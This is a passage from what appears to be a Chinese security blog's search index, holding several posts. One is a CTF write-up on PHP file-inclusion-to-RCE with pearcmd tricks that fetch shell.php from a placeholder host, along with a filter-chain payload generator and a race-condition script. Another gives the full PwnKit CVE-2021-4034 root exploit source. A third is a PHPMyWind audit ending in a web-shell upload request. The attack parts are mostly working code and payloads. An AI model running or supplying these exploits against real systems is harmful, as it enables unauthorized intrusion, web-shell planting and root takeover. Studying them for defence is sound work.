class=\"line\">&#x2F;include.php?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2592a6f21363465ca0bf72f2b65c5526.png\"></p>\n<p>包含一下 <code>/tmp/hello.php</code> 就ok了<br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/1cd1aad16ae44e0c82176793ff5e71af.png\"></p>\n<p>其他利用方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+-c+&#x2F;tmp&#x2F;.feng.php+-d+man_dir&#x3D;&lt;?eval($_POST[0]);?&gt;+-s+</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+install+-R+&#x2F;tmp+http:&#x2F;&#x2F;xxx&#x2F;shell.php</span><br><span class=\"line\"></span><br><span class=\"line\">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php &amp;+download+http:&#x2F;&#x2F;xxx:81&#x2F;shell.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"无需可控文件的LFI\"><a href=\"#无需可控文件的LFI\" class=\"headerlink\" title=\"无需可控文件的LFI\"></a>无需可控文件的LFI</h1><p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需临时文件的 RCE 。更多字符：<a href=\"https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?&#x3D;&#96;$_GET[0]&#96;;;?&gt;</span><br><span class=\"line\">PD89YCRfR0VUWzBdYDs7Pz4&#x3D;</span><br><span class=\"line\">&#x2F;*----------------------*&#x2F;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$base64_payload &#x3D; &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class=\"line\">$conversions &#x3D; array(</span><br><span class=\"line\">    &#39;R&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;,</span><br><span class=\"line\">    &#39;B&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;,</span><br><span class=\"line\">    &#39;C&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR&#39;,</span><br><span class=\"line\">    &#39;8&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;,</span><br><span class=\"line\">    &#39;9&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;,</span><br><span class=\"line\">    &#39;f&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;,</span><br><span class=\"line\">    &#39;s&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;,</span><br><span class=\"line\">    &#39;z&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;,</span><br><span class=\"line\">    &#39;U&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;,</span><br><span class=\"line\">    &#39;P&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;,</span><br><span class=\"line\">    &#39;V&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;,</span><br><span class=\"line\">    &#39;0&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;,</span><br><span class=\"line\">    &#39;Y&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;,</span><br><span class=\"line\">    &#39;W&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;,</span><br><span class=\"line\">    &#39;d&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;,</span><br><span class=\"line\">    &#39;D&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;,</span><br><span class=\"line\">    &#39;7&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;,</span><br><span class=\"line\">    &#39;4&#39; &#x3D;&gt; &#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">$filters &#x3D; &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class=\"line\">$filters .&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class=\"line\">    $filters .&#x3D; $conversions[$c] . &quot;|&quot;;</span><br><span class=\"line\">    $filters .&#x3D; &quot;convert.base64-decode|&quot;;</span><br><span class=\"line\">    $filters .&#x3D; &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\">    $filters .&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$filters .&#x3D; &quot;convert.base64-decode&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$final_payload &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;&#123;$filters&#125;&#x2F;resource&#x3D;data:&#x2F;&#x2F;,aaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class=\"line\">var_dump($final_payload);</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://tttang.com/archive/1395/\">hxp CTF 2021 - The End Of LFI?</a></p>\n<p><a href=\"https://blog.csdn.net/rfrder/article/details/122326155\">[PHP]无需可控文件的LFI-RCE学习</a></p>\n<h1 id=\"session-upload-progress\"><a href=\"#session-upload-progress\" class=\"headerlink\" title=\"session.upload_progress\"></a>session.upload_progress</h1><blockquote>\n<p>session.upload_progress=On</p>\n</blockquote>\n<p>其中最重要的几个设置如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">session.upload_progress.enabled &#x3D; on</span><br><span class=\"line\">session.upload_progress.cleanup &#x3D; on</span><br><span class=\"line\">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class=\"line\">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class=\"line\">session.upload_progress.enabled可以控制是否开启session.upload_progress功能</span><br><span class=\"line\"></span><br><span class=\"line\">session.upload_progress.cleanup可以控制是否在上传之后删除文件内容</span><br><span class=\"line\"></span><br><span class=\"line\">session.upload_progress.prefix可以设置上传文件内容的前缀</span><br><span class=\"line\"></span><br><span class=\"line\">session.upload_progress.name的值即为session中的键值</span><br></pre></td></tr></table></figure>\n<p>脚本：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import threading</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from concurrent.futures import ThreadPoolExecutor, wait</span><br><span class=\"line\"></span><br><span class=\"line\">target &#x3D; &#39;http:&#x2F;&#x2F;192.168.1.162:8080&#x2F;index.php&#39;</span><br><span class=\"line\">session &#x3D; requests.session()</span><br><span class=\"line\">flag &#x3D; &#39;helloworld&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def upload(e: threading.Event):</span><br><span class=\"line\">    files &#x3D; [</span><br><span class=\"line\">        (&#39;file&#39;, (&#39;load.png&#39;, b&#39;a&#39; * 40960, &#39;image&#x2F;png&#39;)),</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    data &#x3D; &#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: rf&#39;&#39;&#39;&lt;?php file_put_contents(&#39;&#x2F;tmp&#x2F;success&#39;, &#39;&lt;?&#x3D;phpinfo()?&gt;&#39;); echo(&#39;&#123;flag&#125;&#39;); ?&gt;&#39;&#39;&#39;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    while not e.is_set():</span><br><span class=\"line\">        requests.post(</span><br><span class=\"line\">            target,</span><br><span class=\"line\">            data&#x3D;data,</span><br><span class=\"line\">            files&#x3D;files,</span><br><span class=\"line\">            cookies&#x3D;&#123;&#39;PHPSESSID&#39;: flag&#125;,</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def write(e: threading.Event):</span><br><span class=\"line\">    while not e.is_set():</span><br><span class=\"line\">        response &#x3D; requests.get(</span><br><span class=\"line\">            f&#39;&#123;target&#125;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;flag&#125;&#39;,</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">        if flag.encode() in response.content:</span><br><span class=\"line\">            e.set()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class=\"line\">    futures &#x3D; []</span><br><span class=\"line\">    event &#x3D; threading.Event()</span><br><span class=\"line\">    pool &#x3D; ThreadPoolExecutor(15)</span><br><span class=\"line\">    for i in range(10):</span><br><span class=\"line\">        futures.append(pool.submit(upload, event))</span><br><span class=\"line\"></span><br><span class=\"line\">    for i in range(5):</span><br><span class=\"line\">        futures.append(pool.submit(write, event))</span><br><span class=\"line\"></span><br><span class=\"line\">    wait(futures)</span><br></pre></td></tr></table></figure>\n","categories":["赛题wp"]},{"title":"Linux提权 CVE-2021-4034","url":"/2023/12/25/Linux%E6%8F%90%E6%9D%83%20CVE-2021-4034/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>Linux Polkit 本地提权漏洞，cvss评分 7.8，高危漏洞</p>\n<p>polkit的pkexec 存在本地权限提升漏洞<br>已获得普通权限的攻击者可以通过此漏洞提权至root权限</p>\n<a id=\"more\"></a>\n<h1 id=\"polkit\"><a href=\"#polkit\" class=\"headerlink\" title=\"polkit\"></a>polkit</h1><p>pkexec 应用程序是一个 setuid 工具，旨在允许非特权用户根据预定义的策略以特权用户身份运行命令，常见的linux发行版 都有 polkit模块</p>\n<h1 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h1><p>因为polkit是系统自带的工具，主流linux版本均受影响</p>\n<h1 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h1><p>EXP：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;*</span><br><span class=\"line\"> * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;</span><br><span class=\"line\"> * Advisory: https:&#x2F;&#x2F;blog.qualys.com&#x2F;vulnerabilities-threat-research&#x2F;2022&#x2F;01&#x2F;25&#x2F;pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</span><br><span class=\"line\"> *&#x2F;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;unistd.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">char *shell &#x3D; </span><br><span class=\"line\">\t&quot;#include &lt;stdio.h&gt;\\n&quot;</span><br><span class=\"line\">\t&quot;#include &lt;stdlib.h&gt;\\n&quot;</span><br><span class=\"line\">\t&quot;#include &lt;unistd.h&gt;\\n\\n&quot;</span><br><span class=\"line\">\t&quot;void gconv() &#123;&#125;\\n&quot;</span><br><span class=\"line\">\t&quot;void gconv_init() &#123;\\n&quot;</span><br><span class=\"line\">\t&quot;\tsetuid(0); setgid(0);\\n&quot;</span><br><span class=\"line\">\t&quot;\tseteuid(0); setegid(0);\\n&quot;</span><br><span class=\"line\">\t&quot;\tsystem(\\&quot;export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin; rm -rf &#39;GCONV_PATH&#x3D;.&#39; &#39;pwnkit&#39;; &#x2F;bin&#x2F;sh\\&quot;);\\n&quot;</span><br><span class=\"line\">\t&quot;\texit(0);\\n&quot;</span><br><span class=\"line\">\t&quot;&#125;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char *argv[]) &#123;</span><br><span class=\"line\">\tFILE *fp;</span><br><span class=\"line\">\tsystem(&quot;mkdir -p &#39;GCONV_PATH&#x3D;.&#39;; touch &#39;GCONV_PATH&#x3D;.&#x2F;pwnkit&#39;; chmod a+x &#39;GCONV_PATH&#x3D;.&#x2F;pwnkit&#39;&quot;);</span><br><span class=\"line\">\tsystem(&quot;mkdir -p pwnkit; echo &#39;module UTF-8&#x2F;&#x2F; PWNKIT&#x2F;&#x2F; pwnkit 2&#39; &gt; pwnkit&#x2F;gconv-modules&quot;);</span><br><span class=\"line\">\tfp &#x3D; fopen(&quot;pwnkit&#x2F;pwnkit.c&quot;, &quot;w&quot;);</span><br><span class=\"line\">\tfprintf(fp, &quot;%s&quot;, shell);</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\tsystem(&quot;gcc pwnkit&#x2F;pwnkit.c -o pwnkit&#x2F;pwnkit.so -shared -fPIC&quot;);</span><br><span class=\"line\">\tchar *env[] &#x3D; &#123; &quot;pwnkit&quot;, &quot;PATH&#x3D;GCONV_PATH&#x3D;.&quot;, &quot;CHARSET&#x3D;PWNKIT&quot;, &quot;SHELL&#x3D;pwnkit&quot;, NULL &#125;;</span><br><span class=\"line\">\texecve(&quot;&#x2F;usr&#x2F;bin&#x2F;pkexec&quot;, (char*[])&#123;NULL&#125;, env);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译生成可执行文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc exp.c -o exp</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/1fa77e55d21749a9a3e7afa1e0af27ec.png\"></p>\n<p>没gcc情况下：<a href=\"https://github.com/nikaiw/CVE-2021-4034\">https://github.com/nikaiw/CVE-2021-4034</a></p>\n","categories":["渗透"]},{"title":"PHPMyWind前台RCE","url":"/2023/12/25/PHPMyWind/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>前台RCE审计一。环境：win11 + php7 + PHPMyWind v5.6.beta</p>\n<a id=\"more\"></a>\n\n<h1 id=\"变量添加\"><a href=\"#变量添加\" class=\"headerlink\" title=\"变量添加\"></a>变量添加</h1><p>调用 _RunMagicQuotes 进行value处理，最后实现变量的添加</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116002914924.png\" alt=\"image-20230116002914924\"></p>\n<p>传入该参数的值如果为数组则递归解析，最后特殊字符 addslashes 处理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116003014152.png\" alt=\"image-20230116003014152\"></p>\n<p>但是该变量名存在问题，可以覆盖 $_SERVER以及$_FILES </p>\n<p>然后就去搜索 <code>$_FILES</code> 的相关处理</p>\n<h1 id=\"权限验证\"><a href=\"#权限验证\" class=\"headerlink\" title=\"权限验证\"></a>权限验证</h1><p>admin的权限是通过 admin/inc/config.inc.php进行验证</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116003858266.png\" alt=\"image-20230116003858266\"></p>\n<p>代码通过<code>$_SESSION</code> 进行验证</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116003945261.png\" alt=\"image-20230116003945261\"></p>\n<h1 id=\"寻找FILE\"><a href=\"#寻找FILE\" class=\"headerlink\" title=\"寻找FILE\"></a>寻找FILE</h1><p>全局搜索后，排除admin目录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116004222723.png\" alt=\"image-20230116004222723\"></p>\n<p>在 Controller_AvatarFlashUpload#uploadavatarAction 中，光看文件处理部分，文件最后保存路径为 upload/$uid.$filetype，$filetype通过在config中进行查找$type，$type通过getimagesize获取，这函数可伪造。基本存在利用的可能</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116010921716.png\" alt=\"image-20230116010921716\"></p>\n<p>看一下实例化的地方 data/avatar/upload.php</p>\n<p>定义$config，这里定义了一个authkey引起了我的注意</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116011510390.png\" alt=\"image-20230116011510390\"></p>\n<p>跟踪一下$cfg_auth_ley存在于 /include/common.func.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$cfg_auth_key &#x3D; &#39;zVQnZqFyAn4EGmjY&#39;;</span><br></pre></td></tr></table></figure>\n\n<p>接着通过参数a控制action。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116011559906.png\" alt=\"image-20230116011559906\"></p>\n<p>最后就是进行调用action</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116011628979.png\" alt=\"image-20230116011628979\"></p>\n<h1 id=\"审计\"><a href=\"#审计\" class=\"headerlink\" title=\"审计\"></a>审计</h1><p>再次回到action中</p>\n<h2 id=\"authkey的获取\"><a href=\"#authkey的获取\" class=\"headerlink\" title=\"authkey的获取\"></a>authkey的获取</h2><p>三个函数getgpc、init_input、input</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116012500823.png\" alt=\"image-20230116012500823\"></p>\n<p>getgpc，通过GET方式获取agent参数的值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116012649658.png\" alt=\"image-20230116012649658\"></p>\n<p>init_input</p>\n<p>先获取input参数值，然后调用 <code>common::authcode</code> 对进行input验证操作，解析到$this-&gt;input，这里两个参数有一些条件限制</p>\n<ul>\n<li><code>$this-&gt;input[&#39;agent&#39;]</code></li>\n<li><code>$this-&gt;input[&#39;time&#39;]</code></li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116012948932.png\" alt=\"image-20230116012948932\"></p>\n<p>input 就是从上面的$this-&gt;input 获取 uid 的值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116013133796.png\" alt=\"image-20230116013133796\"></p>\n<p>综上需要控制的参数有三个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$this-&gt;input[&#39;agent&#39;]</span><br><span class=\"line\">$this-&gt;input[&#39;time&#39;]</span><br><span class=\"line\">$this-&gt;input[&#39;uid&#39;]</span><br></pre></td></tr></table></figure>\n\n<p>跟入 common::authcode，是一个很长的解密函数，key就是上面的 authkey 为 zVQnZqFyAn4EGmjY</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116014126064.png\" alt=\"image-20230116014126064\"></p>\n<p>有解密就有加密，这里可以根据该函数直接构造payload，但是发现authkey为随机的。所以寻找前台可控进行加密的地方</p>\n<p>全局搜索 <code>&#39;ENCODE&#39;</code> 基本都调用了 AuthCode</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116015713533.png\" alt=\"image-20230116015713533\"></p>\n<p>实现encode功能</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116015857366.png\" alt=\"image-20230116015857366\"></p>\n<p>那么就看一下哪个 AuthCode 传入参数可控，最后发现最合适在 shoppingcart.php，对三个参数没有限制，可以直接添加，但是有一个小问题，AuthCode传入的是序列化的字符串，那么在经过解密之后，通过 parse_str 之后能不能实现添加上述的三个变量</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116040401564.png\" alt=\"image-20230116040401564\"></p>\n<p>来个demo发现确实可以添加</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$arr &#x3D; array(</span><br><span class=\"line\">&#39;test&#39;  &#x3D;&gt; &#39;a&amp;a&#x3D;1&amp;b&#x3D;2&amp;&#39;</span><br><span class=\"line\">);</span><br><span class=\"line\">$data &#x3D; serialize($arr);</span><br><span class=\"line\">var_dump($data);</span><br><span class=\"line\">parse_str($data, $tester);</span><br><span class=\"line\">var_dump($tester);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">output:</span><br><span class=\"line\"></span><br><span class=\"line\">string(35) &quot;a:1:&#123;s:4:&quot;test&quot;;s:10:&quot;a&amp;a&#x3D;1&amp;b&#x3D;2&amp;&quot;;&#125;&quot;</span><br><span class=\"line\">array(4) &#123;</span><br><span class=\"line\">  [&quot;a:1:&#123;s:4:&quot;test&quot;;s:10:&quot;a&quot;]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [&quot;a&quot;]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [&quot;b&quot;]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;2&quot;</span><br><span class=\"line\">  [&quot;&quot;;&#125;&quot;]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>构造payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;shoppingcart.php?a&#x3D;addshopingcart&amp;goodsid&#x3D;1&amp;buynum&#x3D;2&amp;agent&#x3D;agent1&amp;goodsattr&#x3D;test%26time&#x3D;9999999%26uid&#x3D;1%26agent&#x3D;agent1</span><br></pre></td></tr></table></figure>\n\n<p>此时返回cookie</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">182bXpJ9OpKFGfv4%2BxS0d6fRxUkRvlNTP1wOAp5gmOfr5ES1O9z2PPDCDU2AThTdNu4sfVehuuOLX6SYCAzbtHYfBl%2B6rCJWGYJZgCR2xjnWmxdOPPzNyjT4s4dwVhacg%2FndWIu3EA4E7HTiU4y2HRmg3Rjl%2FlXNr5mQcMiqkudNxyVRWDdfB4augbECr5A540Gvc9tG7RigkUXDDdBJdBoRmVmdsep30QxEWSuQZutACZ1fPUnp</span><br></pre></td></tr></table></figure>\n\n<p>这时可以伪造并获取authcode</p>\n<h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><p>观察文件写入的路径为 $uid 与 $filetype 构成，uid可控为php，如果让filetype为空，即可上传php，需要注意这里是tmp路径拼接shell路径，所以需要绝对路径写文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116041943675.png\" alt=\"image-20230116041943675\"></p>\n<p>获取</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;shoppingcart.php?a&#x3D;addshopingcart&amp;goodsid&#x3D;1&amp;buynum&#x3D;2&amp;agent&#x3D;agent1&amp;goodsattr&#x3D;test%26time&#x3D;9999999999%26uid&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpstudy_pro\\WWW\\PHPMyWind-master\\Y0shell.php%26agent&#x3D;agent1%26 </span><br><span class=\"line\"></span><br><span class=\"line\">authcode:</span><br><span class=\"line\">2ec59MYBM8iGqrHi9mZlmE2PIFNru5qh0Z4nviEFLIhTG9TuIymP8iAn%2FdwD5HYNZvKqDyAPGn%2BrhwAozGUONIu0eDjJKT89LVp3V1qpRDZT19HPh7wOFuMmr4bA2g8f3FrQTtX%2BoSfshZjmPl13mGHNUpv2KYRFa%2BP34LF1YCaW08eVAUicYBiEghBv6QsRqq2HpX5hCSUSmfyn5W7B%2Bty5F3mcVik2Y575kyfu</span><br></pre></td></tr></table></figure>\n\n<p>上传文件，传入code与agent</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;data&#x2F;avatar&#x2F;upload.php?a&#x3D;uploadavatar&amp;input&#x3D;2ec59MYBM8iGqrHi9mZlmE2PIFNru5qh0Z4nviEFLIhTG9TuIymP8iAn%2FdwD5HYNZvKqDyAPGn%2BrhwAozGUONIu0eDjJKT89LVp3V1qpRDZT19HPh7wOFuMmr4bA2g8f3FrQTtX%2BoSfshZjmPl13mGHNUpv2KYRFa%2BP34LF1YCaW08eVAUicYBiEghBv6QsRqq2HpX5hCSUSmfyn5W7B%2Bty5F3mcVik2Y575kyfu&amp;agent&#x3D;agent1 HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.68.155</span><br><span class=\"line\">Content-Length: 246</span><br><span class=\"line\">Cache-Control: max-age&#x3D;0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: null</span><br><span class=\"line\">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarydj9apJsliR52tHup</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;107.0.0.0 Safari&#x2F;537.36</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundarydj9apJsliR52tHup</span><br><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;Filedata&quot;; filename&#x3D;&quot;test.png&quot;</span><br><span class=\"line\">Content-Type: image&#x2F;png</span><br><span class=\"line\"></span><br><span class=\"line\">#define width 20</span><br><span class=\"line\">#define height 20</span><br><span class=\"line\">&lt;?php eval($_POST[1]);?&gt;</span><br><span class=\"line\">------WebKitFormBoundarydj9apJsliR52tHup--</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.freebuf.com/vuls/326936.html\">我是如何通过变量覆盖挖到PHPMyWind前台RCE</a></p>\n","categories":["代码审计"]},{"title":"Process-Inject-壹","url":"/2024/07/09/Process-Injection/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/statehackers.jpg\" 